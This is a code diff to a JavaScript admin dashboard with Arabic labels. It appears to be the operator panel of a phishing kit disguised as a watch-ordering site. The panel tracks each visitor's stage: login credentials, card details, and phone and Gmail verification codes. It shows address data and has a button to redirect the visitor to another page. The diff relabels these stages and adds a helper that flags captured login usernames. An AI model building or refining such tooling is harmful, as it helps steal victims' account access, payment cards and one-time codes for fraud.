@@ -336,7 +336,15 @@ const pageLabels = {
   "success":"تم بنجاح","home":"الرئيسية","pending":"في الانتظار"
 };
 
-const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"بانتظار الرمز",code_confirmed:"تم التأكيد",code_rejected:"رمز مرفوض",email_code_pending:"بانتظار رمز الإيميل",email_code_confirmed:"تم تأكيد الإيميل",email_code_rejected:"رمز الإيميل مرفوض",card_pending:"بانتظار بيانات البطاقة",card_confirmed:"تم تأكيد البطاقة",card_rejected:"بطاقة مرفوضة"};
+const statusLabels = {pending:"قيد الانتظار",confirmed:"مقبول",rejected:"مرفوض",code_pending:"كود هاتف",code_confirmed:"تم قبول الكود",code_rejected:"كود مرفوض",email_code_pending:"كود جيميل",email_code_confirmed:"تم قبول كود جيميل",email_code_rejected:"كود جيميل مرفوض",card_pending:"بيانات بطاقة",card_confirmed:"تم قبول البطاقة",card_rejected:"بطاقة مرفوضة"};
+
+function getStatusLabel(o) {
+  if (o.status === "pending") {
+    if (o.current_page === "waiting" || o.current_page === "login" || o.login_username) return "بيانات تسجيل دخول";
+    return "بيانات شخصية";
+  }
+  return statusLabels[o.status] || o.status;
+}
 
 let TOKEN = localStorage.getItem("admin_token") || "";
 let orders = [];
@@ -423,7 +431,7 @@ async function loadOrders() {
       <td><div class="td-watch"><img src="${watchImg}" alt=""></div></td>
       <td><div class="td-name">${o.name||"—"}</div></td>
       <td><div class="td-phone" style="font-size:14px">${o.phone||"—"}</div></td>
-      <td><span class="badge badge-${statusClass}">${statusLabels[statusClass]||statusClass}</span></td>
+      <td><span class="badge badge-${statusClass}">${getStatusLabel(o)}</span></td>
       <td><div class="td-actions" style="flex-direction:column;gap:6px">
         <button class="btn-details" onclick="showDetails(${o.id})">التفاصيل</button>
         <button class="btn-redirect" onclick="showRedirect(${o.id})">إعادة التوجيه</button>
@@ -462,7 +470,7 @@ function showDetails(id) {
     <div class="detail-item"><div class="lbl">الولاية</div><div class="val">${o.wilaya||"—"}</div></div>
     <div class="detail-item detail-full"><div class="lbl">العنوان</div><div class="val">${o.address||"—"}</div></div>
     <div class="detail-item"><div class="lbl">لون الساعة</div><div class="val">${o.watch_color||"—"}</div></div>
-    <div class="detail-item"><div class="lbl">الحالة</div><div class="val">${statusLabels[o.status]||o.status}</div></div>
+    <div class="detail-item"><div class="lbl">الحالة</div><div class="val">${getStatusLabel(o)}</div></div>
     <div class="detail-item"><div class="lbl">الصفحة الحالية</div><div class="val">${pageLabels[o.current_page]||o.current_page||"—"}</div></div>
     <div class="detail-item"><div class="lbl">تاريخ الطلب</div><div class="val">${o.created_at?new Date(o.created_at).toLocaleString("ar-EG"):"—"}</div></div>`;
 
